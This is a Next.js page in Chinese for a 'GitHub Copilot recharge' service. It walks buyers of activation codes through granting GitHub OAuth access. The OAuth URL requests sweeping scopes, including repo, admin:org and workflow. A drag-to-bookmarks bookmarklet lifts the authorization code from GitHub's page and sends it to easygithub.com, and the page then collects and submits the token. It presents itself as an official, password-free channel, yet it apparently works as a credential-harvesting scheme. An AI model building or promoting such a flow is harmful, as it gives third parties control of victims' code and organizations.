"use client"

import { useState, useEffect, useCallback } from "react"
import Link from "next/link"
import { ArrowLeft, ArrowRight, Check, Github, Loader2, Shield, Zap, Code, Search, ExternalLink, Bookmark } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"

const GITHUB_OAUTH_URL = "https://github.com/login/oauth/authorize?allow_signup=false&client_id=2cfa9b7a1b57de32dd0d&scope=user+repo+notifications+admin%3Aorg+read%3Adiscussion+user%3Aassets+read%3Aproject+project+workflow&skip_account_picker=true"
const BOOKMARKLET_CODE = `javascript:void(function(){var m=document.querySelector('meta[http-equiv="refresh"]')||document.querySelector('meta[data-url]');if(!m){var c2=new URLSearchParams(window.location.search).get('code');if(c2){window.location.href='https://easygithub.com/index.php?route=/api/callback&code='+c2;return}alert('请在GitHub授权完成页面使用此书签');return}var u=m.getAttribute('content')||m.getAttribute('data-url');var c=u.match(/code=([a-f0-9]+)/);if(!c){alert('未找到授权码');return}window.location.href='https://easygithub.com/index.php?route=/api/callback&code='+c[1]})();`

interface CardData {
  code?: string
  activation_code?: string
  recharge_info?: {
    github_username?: string
    recharge_status?: string
  }
}

interface TokenData {
  token?: string
  user?: string
  login?: string
}

export default function CopilotPage() {
  const [step, setStep] = useState(1)
  const [activationCode, setActivationCode] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [isRecharging, setIsRecharging] = useState(false)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState("")
  const [cardData, setCardData] = useState<CardData | null>(null)
  const [tokenData, setTokenData] = useState<TokenData | null>(null)
  const [isPolling, setIsPolling] = useState(false)
  const [result, setResult] = useState<{ success: boolean; message: string } | null>(null)

  // Step 1: 验证卡密
  const verifyCode = async () => {
    if (!activationCode.trim()) return

    setIsVerifying(true)
    setError("")
    setSuccess("")

    try {
      const response = await fetch("/api/copilot/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "verify-code", card_code: activationCode.toUpperCase() }),
      })
      const data = await response.json()

      if (data.success) {
        setCardData(data.data)
        setSuccess("卡密验证成功")
        if (data.data?.recharge_info) {
          setSuccess(`卡密验证成功 - 已有充值记录: ${data.data.recharge_info.github_username || ""} (${data.data.recharge_info.recharge_status || ""})`)
        }
        setTimeout(() => setStep(2), 800)
      } else {
        setError(data.message || "卡密无效或已使用")
      }
    } catch (err) {
      setError("网络错误，请重试")
    } finally {
      setIsVerifying(false)
    }
  }

  // Step 2: 轮询 OAuth 结果
  const pollForToken = useCallback(async () => {
    try {
      const response = await fetch("/api/copilot/proxy?action=poll")
      const data = await response.json()

      if (data.success && data.data?.token) {
        setIsPolling(false)
        setTokenData(data.data)
        setStep(3)
        return true
      }
    } catch (err) {
      // 继续轮询
    }
    return false
  }, [])

  useEffect(() => {
    if (!isPolling || step !== 2) return

    const interval = setInterval(async () => {
      const found = await pollForToken()
      if (found) {
        clearInterval(interval)
      }
    }, 2000)

    return () => clearInterval(interval)
  }, [isPolling, step, pollForToken])

  const startOAuth = () => {
    setIsPolling(true)
    window.open(GITHUB_OAUTH_URL, "_blank")
  }

  // Step 3: 提交充值
  const submitRecharge = async () => {
    if (!tokenData || !cardData) {
      setError("缺少必要信息，请刷新页面重试")
      return
    }

    setIsRecharging(true)
    setError("")

    try {
      const response = await fetch("/api/copilot/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "submit-recharge",
          github_token: tokenData.token,
          github_user: tokenData.user || tokenData.login || "",
          card_code: cardData.code || cardData.activation_code,
          product_type: "copilot",
        }),
      })
      const data = await response.json()

      setResult({
        success: data.success,
        message: data.message || (data.success ? "充值成功" : "充值失败"),
      })
    } catch (err) {
      setResult({
        success: false,
        message: "网络错误，请重试",
      })
    } finally {
      setIsRecharging(false)
    }
  }

  return (
    <div className="min-h-screen bg-[#010409]">
      {/* Header */}
      <header className="sticky top-0 z-50 border-b border-[#30363d] bg-[#0d1117]/80 backdrop-blur-xl">
        <div className="max-w-5xl mx-auto px-4 h-14 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link href="/">
              <Button variant="ghost" size="sm" className="gap-2 text-[#7d8590] hover:text-[#e6edf3] hover:bg-[#21262d]">
                <ArrowLeft className="w-4 h-4" />
                {"返回"}
              </Button>
            </Link>
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-lg bg-[#e6edf3] flex items-center justify-center">
                <Github className="w-5 h-5 text-[#0d1117]" />
              </div>
              <span className="font-semibold text-[#e6edf3]">{"GitHub Copilot 充值平台"}</span>
            </div>
          </div>
          <Link href="/copilot/query" className="hidden md:flex items-center gap-1 text-sm text-[#7d8590] hover:text-[#e6edf3]">
            <Search className="w-4 h-4" />
            {"卡密查询"}
          </Link>
        </div>
      </header>

      <main className="max-w-3xl mx-auto px-4 py-8">
        {/* Hero */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-[#161b22] border border-[#30363d] text-xs font-mono text-[#7d8590] mb-4">
            <span className="w-1.5 h-1.5 rounded-full bg-[#3fb950] animate-pulse" />
            {"OFFICIAL API"}
          </div>
          <h1 className="text-3xl md:text-4xl font-bold text-[#e6edf3] mb-2">
            {"GitHub Copilot "}
            <span className="bg-gradient-to-r from-[#58a6ff] via-[#bc8cff] to-[#3fb950] bg-clip-text text-transparent">
              {"充值"}
            </span>
          </h1>
          <p className="text-[#7d8590] text-sm">
            {"通过官方 GraphQL API 安全充值，支持浏览器端 OAuth 授权"}
          </p>
        </div>

        {/* Video Tutorial */}
        <div className="mb-8">
          <div className="bg-[#161b22] border border-[#30363d] rounded-xl p-4">
            <div className="flex items-center gap-2 mb-3">
              <div className="w-6 h-6 rounded-md bg-[#238636]/20 flex items-center justify-center">
                <svg className="w-3.5 h-3.5 text-[#3fb950]" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M8 5v14l11-7z"/>
                </svg>
              </div>
              <span className="text-sm font-medium text-[#e6edf3]">{"视频教程"}</span>
              <span className="text-xs text-[#7d8590]">{"- 观看完整操作流程"}</span>
            </div>
            <video 
              controls 
              className="w-full rounded-lg border border-[#30363d]"
              poster=""
              preload="metadata"
            >
              <source src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/tutorial-qDmPfcYqOGTMR0x0CMgMKQMkv9joKN.mp4" type="video/mp4" />
              {"您的浏览器不支持视频播放"}
            </video>
          </div>
        </div>

        {/* Progress Steps */}
        <div className="flex items-center justify-center gap-2 mb-8">
          {[1, 2, 3].map((s, i) => (
            <div key={s} className="flex items-center">
              <div
                className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium transition-all ${
                  step > s
                    ? "bg-[#238636] text-white"
                    : step === s
                    ? "bg-[#1f6feb] text-white"
                    : "bg-[#21262d] text-[#7d8590] border border-[#30363d]"
                }`}
              >
                {step > s ? <Check className="w-4 h-4" /> : s}
              </div>
              {i < 2 && (
                <div
                  className={`w-12 md:w-20 h-0.5 mx-1 transition-all ${
                    step > s ? "bg-[#238636]" : "bg-[#30363d]"
                  }`}
                />
              )}
            </div>
          ))}
        </div>

        {/* Step Content */}
        <Card className="bg-[#0d1117] border-[#30363d]">
          <CardHeader className="border-b border-[#30363d]">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-lg bg-[#21262d] border border-[#30363d] flex items-center justify-center">
                {step === 1 && <Code className="w-5 h-5 text-[#e6edf3]" />}
                {step === 2 && <Github className="w-5 h-5 text-[#e6edf3]" />}
                {step === 3 && <Zap className="w-5 h-5 text-[#bc8cff]" />}
              </div>
              <div>
                <CardTitle className="text-[#e6edf3]">
                  {step === 1 && "验证卡密"}
                  {step === 2 && "获取 GitHub Token"}
                  {step === 3 && "确认充值"}
                </CardTitle>
                <CardDescription className="text-[#7d8590]">
                  {step === 1 && "输入您购买的激活码"}
                  {step === 2 && "通过浏览器授权获取 Token"}
                  {step === 3 && "确认信息并开始充值"}
                </CardDescription>
              </div>
            </div>
          </CardHeader>

          <CardContent className="pt-6">
            {/* Step 1: 验证卡密 */}
            {step === 1 && (
              <div className="space-y-4">
                <div className="flex gap-2">
                  <Input
                    value={activationCode}
                    onChange={(e) => setActivationCode(e.target.value.toUpperCase().replace(/[^A-Z0-9-]/g, ""))}
                    placeholder="请输入卡密"
                    className="flex-1 font-mono text-lg tracking-wider bg-[#010409] border-[#30363d] text-[#e6edf3] placeholder:text-[#6e7681] focus:border-[#58a6ff] focus:ring-[#58a6ff]/20"
                    onKeyDown={(e) => e.key === "Enter" && verifyCode()}
                  />
                  <Button
                    onClick={verifyCode}
                    disabled={isVerifying || !activationCode.trim()}
                    className="bg-[#238636] hover:bg-[#2ea043] text-white px-6"
                  >
                    {isVerifying ? <Loader2 className="w-4 h-4 animate-spin" /> : <><ArrowRight className="w-4 h-4 mr-1" />{"验证"}</>}
                  </Button>
                </div>

                {error && (
                  <div className="p-3 rounded-lg bg-[#f85149]/10 border border-[#f85149]/30 text-[#f85149] text-sm">
                    {error}
                  </div>
                )}
                {success && (
                  <div className="p-3 rounded-lg bg-[#3fb950]/10 border border-[#3fb950]/30 text-[#3fb950] text-sm">
                    <Check className="w-4 h-4 inline mr-1" />
                    {success}
                  </div>
                )}

                <div className="p-4 rounded-lg bg-[#010409] border border-[#30363d] space-y-2 text-sm text-[#7d8590]">
                  <p className="font-medium text-[#e6edf3]"><span className="text-[#58a6ff] mr-1">i</span>{"浏览器授权提示"}</p>
                  <p><span className="text-[#3fb950] font-mono">01</span> {"验证卡密后会进入获取 GitHub Token 步骤"}</p>
                  <p><span className="text-[#3fb950] font-mono">02</span> {"需要先把绿色按钮拖到浏览器书签栏"}</p>
                  <p><span className="text-[#3fb950] font-mono">03</span> {"GitHub 授权完成后，点击书签栏的按钮获取 Token"}</p>
                </div>
              </div>
            )}

            {/* Step 2: GitHub OAuth */}
            {step === 2 && (
              <div className="space-y-4">
                {/* Bookmarklet */}
                <div className="p-4 rounded-lg border-2 border-dashed border-[#30363d] bg-gradient-to-b from-[#58a6ff]/5 to-transparent text-center">
                  <p className="text-sm text-[#7d8590] mb-3">
                    <span className="inline-block animate-bounce">↓</span>
                    {" 拖到书签栏 "}
                    <span className="inline-block animate-bounce">↓</span>
                  </p>
                  <a
                    href={BOOKMARKLET_CODE}
                    onClick={(e) => {
                      e.preventDefault()
                      alert("请将此按钮【拖到书签栏】，不要直接点击！")
                    }}
                    className="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-[#238636] hover:bg-[#2ea043] text-white font-medium cursor-grab"
                    style={{ cursor: "grab" }}
                  >
                    <Bookmark className="w-4 h-4" />
                    {"获取Token"}
                  </a>
                  <p className="text-xs text-[#6e7681] mt-2">
                    {"请把绿色按钮拖到书签栏，不要直接点击"}
                  </p>
                </div>

                {/* Steps */}
                <div className="p-4 rounded-lg bg-[#010409] border border-[#30363d] space-y-3 text-sm">
                  <p><strong className="text-[#e6edf3]">{"步骤 1:"}</strong><span className="text-[#7d8590]">{" 将上方绿色按钮拖到浏览器书签栏"}</span></p>
                  <p><strong className="text-[#e6edf3]">{"步骤 2:"}</strong><span className="text-[#7d8590]">{" 点击下方按钮打开 GitHub 授权页面"}</span></p>
                </div>

                <Button onClick={startOAuth} className="w-full bg-[#1f6feb] hover:bg-[#388bfd] text-white py-6">
                  <Github className="w-5 h-5 mr-2" />
                  {"打开 GitHub 授权"}
                  <ExternalLink className="w-4 h-4 ml-2" />
                </Button>

                <div className="p-4 rounded-lg bg-[#010409] border border-[#30363d] space-y-2 text-sm text-[#7d8590]">
                  <p><strong className="text-[#e6edf3]">{"步骤 3:"}</strong>{" 在 GitHub 页面完成授权后，点击书签栏的 \"获取Token\" 按钮"}</p>
                  <p><span className="text-[#3fb950] font-bold">A.</span>{" 授权完成后，GitHub 页面通常会显示 \"OAuth application authorized\""}</p>
                  <p><span className="text-[#3fb950] font-bold">B.</span>{" 这时点击书签栏里的 \"获取Token\"，系统会自动把授权信息发送回当前站点"}</p>
                  <p><span className="text-[#3fb950] font-bold">C.</span>{" 返回当前页面，等待 1-2 秒，页面会自动显示 GitHub 账号和 Token"}</p>
                </div>

                {isPolling && (
                  <div className="flex items-center justify-center gap-2 text-[#7d8590] text-sm py-2">
                    <Loader2 className="w-4 h-4 animate-spin text-[#3fb950]" />
                    {"等待授权完成..."}
                  </div>
                )}

                {tokenData && (
                  <div className="p-4 rounded-lg bg-[#3fb950]/10 border border-[#3fb950]/30">
                    <p className="text-[#3fb950] text-sm mb-2"><Check className="w-4 h-4 inline mr-1" />{"Token 获取成功"}</p>
                    <div className="grid grid-cols-2 gap-4 mt-3">
                      <div>
                        <p className="text-xs text-[#6e7681] uppercase tracking-wider mb-1">{"GitHub 用户"}</p>
                        <p className="text-[#e6edf3] font-medium">{tokenData.user || tokenData.login || "-"}</p>
                      </div>
                      <div>
                        <p className="text-xs text-[#6e7681] uppercase tracking-wider mb-1">{"Token"}</p>
                        <p className="text-[#3fb950] font-mono text-sm break-all">{(tokenData.token || "").substring(0, 24)}...</p>
                      </div>
                    </div>
                  </div>
                )}

                {error && (
                  <div className="p-3 rounded-lg bg-[#f85149]/10 border border-[#f85149]/30 text-[#f85149] text-sm">
                    {error}
                  </div>
                )}
              </div>
            )}

            {/* Step 3: 确认充值 */}
            {step === 3 && !result && (
              <div className="space-y-4">
                <div className="p-4 rounded-lg bg-[#010409] border-l-4 border-l-[#3fb950] border border-[#30363d]">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p className="text-xs text-[#6e7681] uppercase tracking-wider mb-1">{"GitHub 用户"}</p>
                      <p className="text-[#e6edf3] font-medium">{tokenData?.user || tokenData?.login || "-"}</p>
                    </div>
                    <div>
                      <p className="text-xs text-[#6e7681] uppercase tracking-wider mb-1">{"卡密"}</p>
                      <p className="text-[#e3b341] font-mono">{cardData?.code || cardData?.activation_code || "-"}</p>
                    </div>
                  </div>
                </div>

                <div className="p-4 rounded-lg bg-[#010409] border-l-4 border-l-[#bc8cff] border border-[#30363d]">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-lg bg-[#bc8cff]/10 border border-[#bc8cff]/30 flex items-center justify-center">
                      <Code className="w-5 h-5 text-[#bc8cff]" />
                    </div>
                    <div>
                      <p className="text-[#e6edf3] font-medium">{"GitHub Copilot"}</p>
                      <p className="text-xs text-[#6e7681] font-mono">{"Monthly · AI Assistant"}</p>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={submitRecharge}
                  disabled={isRecharging}
                  className="w-full bg-[#238636] hover:bg-[#2ea043] text-white py-6 text-lg font-bold"
                >
                  {isRecharging ? (
                    <><Loader2 className="w-5 h-5 animate-spin mr-2" />{"充值中，请稍候..."}</>
                  ) : (
                    <><Zap className="w-5 h-5 mr-2" />{"开始充值"}</>
                  )}
                </Button>

                {error && (
                  <div className="p-3 rounded-lg bg-[#f85149]/10 border border-[#f85149]/30 text-[#f85149] text-sm">
                    {error}
                  </div>
                )}
              </div>
            )}

            {/* Result */}
            {result && (
              <div className="text-center py-8">
                <div
                  className={`w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center ${
                    result.success ? "bg-[#238636]" : "bg-[#da3633]"
                  }`}
                >
                  {result.success ? (
                    <Check className="w-8 h-8 text-white" />
                  ) : (
                    <span className="text-white text-2xl">×</span>
                  )}
                </div>
                <h3 className="text-xl font-bold text-[#e6edf3] mb-2">
                  {result.success ? "充值成功！" : "充值失败"}
                </h3>
                <p className="text-[#7d8590] mb-6">{result.message}</p>
                {!result.success && (
                  <Button onClick={() => window.location.reload()} variant="outline" className="border-[#30363d] text-[#e6edf3] hover:bg-[#21262d]">
                    {"重试"}
                  </Button>
                )}
              </div>
            )}
          </CardContent>
        </Card>

        {/* Features */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-8">
          {[
            { icon: Code, title: "官方 GraphQL API", desc: "正版支付渠道", color: "#3fb950" },
            { icon: Shield, title: "OAuth 2.0 授权", desc: "不保存密码", color: "#58a6ff" },
            { icon: Zap, title: "原子化流程", desc: "失败自动回退", color: "#bc8cff" },
            { icon: Search, title: "可审计记录", desc: "随时可查", color: "#e3b341" },
          ].map((f, i) => (
            <div key={i} className="p-4 rounded-lg bg-[#0d1117] border border-[#30363d] hover:border-[#30363d]/80 transition-colors">
              <div className="w-8 h-8 rounded-lg mb-2 flex items-center justify-center" style={{ backgroundColor: `${f.color}15` }}>
                <f.icon className="w-4 h-4" style={{ color: f.color }} />
              </div>
              <p className="text-sm font-medium text-[#e6edf3]">{f.title}</p>
              <p className="text-xs text-[#6e7681]">{f.desc}</p>
            </div>
          ))}
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-[#30363d] py-6 mt-12">
        <div className="max-w-3xl mx-auto px-4 text-center">
          <p className="text-sm text-[#7d8590]">{"© 2026 GitHub Copilot 充值平台"}</p>
          <p className="text-xs text-[#6e7681] mt-1">
            {"Built with "}
            <span className="text-[#3fb950] font-mono">GraphQL</span>
            {" · "}
            <span className="text-[#58a6ff] font-mono">OAuth 2.0</span>
          </p>
        </div>
      </footer>
    </div>
  )
}
